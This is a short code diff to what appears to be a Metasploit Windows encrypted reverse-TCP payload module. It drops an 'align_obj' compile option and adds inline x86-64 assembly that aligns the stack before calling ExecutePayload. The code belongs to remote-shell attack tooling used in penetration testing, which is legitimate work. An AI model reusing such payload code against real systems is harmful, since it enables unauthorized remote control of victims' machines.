@@ -56,7 +56,6 @@ module Payload::Windows::EncryptedReverseTcp
     {
       strip_symbols: datastore['StripSymbols'],
       linker_script: datastore['LinkerScript'],
-      align_obj:     datastore['AlignObj'] || '',
       opt_lvl:       datastore['OptLevel'],
       keep_src:      datastore['KeepSrc'],
       keep_exe:      datastore['KeepExe'],
@@ -121,7 +120,6 @@ module Payload::Windows::EncryptedReverseTcp
     {
       strip_symbols: false,
       linker_script: datastore['LinkerScript'],
-      align_obj:     datastore['AlignObj'] || '',
       keep_src:      datastore['KeepSrc'],
       keep_exe:      datastore['KeepExe'],
       f_name:        'reverse_pic_stage.exe',
@@ -203,7 +201,17 @@ module Payload::Windows::EncryptedReverseTcp
 
   def align_rsp
     %Q^
-      extern VOID AlignRSP();
+      void AlignRSP()
+      {
+        asm("push %rsi                      \\t\\n\\
+             mov %rsp, %rsi                 \\t\\n\\
+             and $0x0FFFFFFFFFFFFFFF0, %rsp \\t\\n\\
+             sub $0x020, %rsp               \\t\\n\\
+             call ExecutePayload            \\t\\n\\
+             mov %rsi, %rsp                 \\t\\n\\
+             pop %rsi                       \\t\\n\\
+             ret");
+      }
     ^
   end
 
